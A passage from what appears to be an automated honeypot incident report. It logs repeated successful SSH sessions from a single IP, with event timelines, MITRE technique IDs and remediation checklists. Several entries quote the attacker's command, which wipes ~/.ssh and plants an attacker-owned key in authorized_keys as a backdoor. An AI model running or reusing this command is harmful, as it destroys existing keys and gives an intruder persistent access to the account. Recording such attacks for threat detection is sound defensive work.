| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:12:00` | `cowrie.session.connect` |
| `2026-05-04 11:12:00` | `cowrie.client.version` |
| `2026-05-04 11:12:00` | `cowrie.client.kex` |
| `2026-05-04 11:12:01` | `cowrie.login.success` |
| `2026-05-04 11:12:01` | `cowrie.session.params` |
| `2026-05-04 11:12:01` | `cowrie.command.input` |
| `2026-05-04 11:12:01` | `cowrie.command.failed` |
| `2026-05-04 11:12:01` | `cowrie.log.closed` |
| `2026-05-04 11:12:02` | `cowrie.session.params` |
| `2026-05-04 11:12:02` | `cowrie.command.input` |
| `2026-05-04 11:12:02` | `cowrie.session.file_download` |
| `2026-05-04 11:12:02` | `cowrie.log.closed` |
| `2026-05-04 11:12:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6691d6352e5

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:12 |
| **Last Seen** | 2026-05-04 11:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:12:04` | `cowrie.session.connect` |
| `2026-05-04 11:12:04` | `cowrie.client.version` |
| `2026-05-04 11:12:04` | `cowrie.client.kex` |
| `2026-05-04 11:12:04` | `cowrie.login.success` |
| `2026-05-04 11:12:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8b73175e640

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:13 |
| **Last Seen** | 2026-05-04 11:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:13:37` | `cowrie.session.connect` |
| `2026-05-04 11:13:37` | `cowrie.client.version` |
| `2026-05-04 11:13:38` | `cowrie.client.kex` |
| `2026-05-04 11:13:38` | `cowrie.login.success` |
| `2026-05-04 11:13:38` | `cowrie.session.params` |
| `2026-05-04 11:13:38` | `cowrie.command.input` |
| `2026-05-04 11:13:38` | `cowrie.command.failed` |
| `2026-05-04 11:13:38` | `cowrie.log.closed` |
| `2026-05-04 11:13:39` | `cowrie.session.params` |
| `2026-05-04 11:13:39` | `cowrie.command.input` |
| `2026-05-04 11:13:39` | `cowrie.session.file_download` |
| `2026-05-04 11:13:39` | `cowrie.log.closed` |
| `2026-05-04 11:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fe94f46e869

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:13 |
| **Last Seen** | 2026-05-04 11:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:13:41` | `cowrie.session.connect` |
| `2026-05-04 11:13:41` | `cowrie.client.version` |
| `2026-05-04 11:13:41` | `cowrie.client.kex` |
| `2026-05-04 11:13:41` | `cowrie.login.success` |
| `2026-05-04 11:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3f310adae7b

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:14 |
| **Last Seen** | 2026-05-04 11:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:14:53` | `cowrie.session.connect` |
| `2026-05-04 11:14:53` | `cowrie.client.version` |
| `2026-05-04 11:14:53` | `cowrie.client.kex` |
| `2026-05-04 11:14:53` | `cowrie.login.success` |
| `2026-05-04 11:14:53` | `cowrie.session.params` |
| `2026-05-04 11:14:53` | `cowrie.command.input` |
| `2026-05-04 11:14:53` | `cowrie.command.failed` |
| `2026-05-04 11:14:53` | `cowrie.log.closed` |
| `2026-05-04 11:14:54` | `cowrie.session.params` |
| `2026-05-04 11:14:54` | `cowrie.command.input` |
| `2026-05-04 11:14:54` | `cowrie.session.file_download` |
| `2026-05-04 11:14:54` | `cowrie.log.closed` |
| `2026-05-04 11:14:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6923cc99ee11

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:14 |
| **Last Seen** | 2026-05-04 11:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:14:56` | `cowrie.session.connect` |
| `2026-05-04 11:14:56` | `cowrie.client.version` |
| `2026-05-04 11:14:56` | `cowrie.client.kex` |
| `2026-05-04 11:14:56` | `cowrie.login.success` |
| `2026-05-04 11:14:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad8f6c99174c

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:16 |
| **Last Seen** | 2026-05-04 11:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:16:08` | `cowrie.session.connect` |
| `2026-05-04 11:16:08` | `cowrie.client.version` |
| `2026-05-04 11:16:08` | `cowrie.client.kex` |
| `2026-05-04 11:16:09` | `cowrie.login.success` |
| `2026-05-04 11:16:09` | `cowrie.session.params` |
| `2026-05-04 11:16:09` | `cowrie.command.input` |
| `2026-05-04 11:16:09` | `cowrie.command.failed` |
| `2026-05-04 11:16:09` | `cowrie.log.closed` |
| `2026-05-04 11:16:09` | `cowrie.session.params` |
| `2026-05-04 11:16:09` | `cowrie.command.input` |
| `2026-05-04 11:16:10` | `cowrie.session.file_download` |
| `2026-05-04 11:16:10` | `cowrie.log.closed` |
| `2026-05-04 11:16:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-356342f67eb5

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:16 |
| **Last Seen** | 2026-05-04 11:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:16:11` | `cowrie.session.connect` |
| `2026-05-04 11:16:11` | `cowrie.client.version` |
| `2026-05-04 11:16:11` | `cowrie.client.kex` |
| `2026-05-04 11:16:12` | `cowrie.login.success` |
| `2026-05-04 11:16:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3efe44548dc

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:17 |
| **Last Seen** | 2026-05-04 11:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:17:21` | `cowrie.session.connect` |
| `2026-05-04 11:17:21` | `cowrie.client.version` |
| `2026-05-04 11:17:21` | `cowrie.client.kex` |
| `2026-05-04 11:17:22` | `cowrie.login.success` |
| `2026-05-04 11:17:22` | `cowrie.session.params` |
| `2026-05-04 11:17:22` | `cowrie.command.input` |
| `2026-05-04 11:17:22` | `cowrie.command.failed` |
| `2026-05-04 11:17:22` | `cowrie.log.closed` |
| `2026-05-04 11:17:22` | `cowrie.session.params` |
| `2026-05-04 11:17:22` | `cowrie.command.input` |
| `2026-05-04 11:17:23` | `cowrie.session.file_download` |
| `2026-05-04 11:17:23` | `cowrie.log.closed` |
| `2026-05-04 11:17:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7b8c3f2bb96

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:17 |
| **Last Seen** | 2026-05-04 11:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:17:24` | `cowrie.session.connect` |
| `2026-05-04 11:17:24` | `cowrie.client.version` |
| `2026-05-04 11:17:24` | `cowrie.client.kex` |
| `2026-05-04 11:17:25` | `cowrie.login.success` |
| `2026-05-04 11:17:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13dd32823a08

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:18 |
| **Last Seen** | 2026-05-04 11:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:18:51` | `cowrie.session.connect` |
| `2026-05-04 11:18:51` | `cowrie.client.version` |
| `2026-05-04 11:18:52` | `cowrie.client.kex` |
| `2026-05-04 11:18:52` | `cowrie.login.success` |
| `2026-05-04 11:18:52` | `cowrie.session.params` |
| `2026-05-04 11:18:52` | `cowrie.command.input` |
| `2026-05-04 11:18:52` | `cowrie.command.failed` |
| `2026-05-04 11:18:52` | `cowrie.log.closed` |
| `2026-05-04 11:18:53` | `cowrie.session.params` |
| `2026-05-04 11:18:53` | `cowrie.command.input` |
| `2026-05-04 11:18:53` | `cowrie.session.file_download` |
| `2026-05-04 11:18:53` | `cowrie.log.closed` |
| `2026-05-04 11:18:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9065a2a602d8

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:18 |
| **Last Seen** | 2026-05-04 11:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:18:55` | `cowrie.session.connect` |
| `2026-05-04 11:18:55` | `cowrie.client.version` |
| `2026-05-04 11:18:55` | `cowrie.client.kex` |
| `2026-05-04 11:18:55` | `cowrie.login.success` |
| `2026-05-04 11:18:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82241136e2cd

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:20 |
| **Last Seen** | 2026-05-04 11:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:20:07` | `cowrie.session.connect` |
| `2026-05-04 11:20:07` | `cowrie.client.version` |
| `2026-05-04 11:20:07` | `cowrie.client.kex` |
| `2026-05-04 11:20:08` | `cowrie.login.success` |
| `2026-05-04 11:20:08` | `cowrie.session.params` |
| `2026-05-04 11:20:08` | `cowrie.command.input` |
| `2026-05-04 11:20:08` | `cowrie.command.failed` |
| `2026-05-04 11:20:08` | `cowrie.log.closed` |
| `2026-05-04 11:20:08` | `cowrie.session.params` |
| `2026-05-04 11:20:08` | `cowrie.command.input` |
| `2026-05-04 11:20:08` | `cowrie.session.file_download` |
| `2026-05-04 11:20:08` | `cowrie.log.closed` |
| `2026-05-04 11:20:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab55bc15771c

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:20 |
| **Last Seen** | 2026-05-04 11:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:20:10` | `cowrie.session.connect` |
| `2026-05-04 11:20:10` | `cowrie.client.version` |
| `2026-05-04 11:20:10` | `cowrie.client.kex` |
| `2026-05-04 11:20:11` | `cowrie.login.success` |
| `2026-05-04 11:20:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37490fe62992

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:21 |
| **Last Seen** | 2026-05-04 11:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:21:21` | `cowrie.session.connect` |
| `2026-05-04 11:21:21` | `cowrie.client.version` |
| `2026-05-04 11:21:21` | `cowrie.client.kex` |
| `2026-05-04 11:21:21` | `cowrie.login.success` |
| `2026-05-04 11:21:21` | `cowrie.session.params` |
| `2026-05-04 11:21:21` | `cowrie.command.input` |
| `2026-05-04 11:21:21` | `cowrie.command.failed` |
| `2026-05-04 11:21:21` | `cowrie.log.closed` |
| `2026-05-04 11:21:22` | `cowrie.session.params` |
| `2026-05-04 11:21:22` | `cowrie.command.input` |
| `2026-05-04 11:21:22` | `cowrie.session.file_download` |
| `2026-05-04 11:21:22` | `cowrie.log.closed` |
| `2026-05-04 11:21:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c003ada2495e

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:21 |
| **Last Seen** | 2026-05-04 11:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:21:24` | `cowrie.session.connect` |
| `2026-05-04 11:21:24` | `cowrie.client.version` |
| `2026-05-04 11:21:24` | `cowrie.client.kex` |
| `2026-05-04 11:21:24` | `cowrie.login.success` |
| `2026-05-04 11:21:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.97[.]211` to AbuseIPDB if not already reported
- [ ] Block `154.219.97[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42afc3ff06b4

| Field | Detail |
|---|---|
| **Source IP** | `154.219.97[.]211` |
| **First Seen** | 2026-05-04 11:22 |
| **Last Seen** | 2026-05-04 11:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 11:22:37` | `cowrie.session.connect` |
| `2026-05-04 11:22:37` | `cowrie.client.version` |
| `2026-05-04 11:22:37` | `cowrie.client.kex` |
| `2026-05-04 11:22:38` | `cowrie.login.success` |
| `2026-05-04 11:22:38` | `cowrie.session.params` |
| `2026-05-04 11:22:38` | `cowrie.command.input` |
